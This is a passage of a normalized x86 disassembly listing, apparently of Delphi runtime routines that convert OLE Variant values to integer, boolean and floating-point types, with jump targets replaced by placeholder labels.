mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410180
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41009c
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4100d8
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40ed6c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403194
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403194
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403194
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403194
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403194
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403194
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41013c
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_41009c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_41009c
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_4103d7 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a24
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a24
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402a24
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a24
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ffe8
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410180
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403194
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403194
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403194
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403194
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403194
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403194
sub_4105d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40ed6c
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_41065c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410180
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403194
sub_410680
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40ed6c
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_410703
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410180
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403194
sub_410728
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_4107fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410180
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_41074e ]
jmp [ eax * 4 + jump_table_410760 ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403194
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40ed6c
sub_410820
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_4108d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410180
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_410842 ]
jmp [ eax * 4 + jump_table_410855 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403194
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40ed6c
sub_4108f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_4109bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410c44
test edx edx
je r-xdata
mov al [ eax + lookup_table_41091e ]
jmp [ eax * 4 + jump_table_410932 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403194
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40ed6c
sub_4109e0
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_402a24
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40f1ac
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_411240
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_410a8c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410b7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_413208
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_40422c
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_4085b8
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410b81
lea eax [ ebp - 0x1c ]
call sub_403fa4
lea eax [ ebp - 0xc ]
call sub_4046b0
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_402a24
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40f1ac
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_411240
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_410b8c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410be3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f878
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410c44
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410bea
lea eax [ ebp - 0x18 ]
call sub_40f550
retn
sub_410bf8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415bdc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410c44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_411050
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410c77 ]
mov eax [ ebp - 0x4 ]
call sub_410a8c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a24
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a24
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402a24
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a24
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410a8c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410c44
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4109e0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410b8c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40ed6c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_410bf8
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_4109e0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_4109e0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_410e9b ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a24
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a24
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402a24
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a24
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410a8c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410c44
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_411088
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41113f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_413208
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_40422c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_4086a4
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411146
lea eax [ ebp - 0x10 ]
call sub_403fa4
lea eax [ ebp - 0x8 ]
call sub_4046b0
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40f1ac
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40f1ac
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_411150
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40f1ac
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_411190
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4111e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40f878
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_411240
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4111eb
lea eax [ ebp - 0x11 ]
call sub_40f550
retn
sub_4111f4
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415bdc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_411240
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41125a ]
mov eax ebx
call sub_411088
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_411088
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_411240
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_411150
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_411190
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40ed6c
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4111f4
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411150
mov [ esp ] al
mov eax ebx
call sub_411150
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_41141c ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_411088
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_411240
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_411594
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411649
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_413208
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_40422c
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_409a84
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40f1ac
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40f1ac
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411650
lea eax [ ebp - 0x1c ]
call sub_403fa4
lea eax [ ebp - 0xc ]
call sub_4046b0
retn
sub_411658
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40f1ac
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
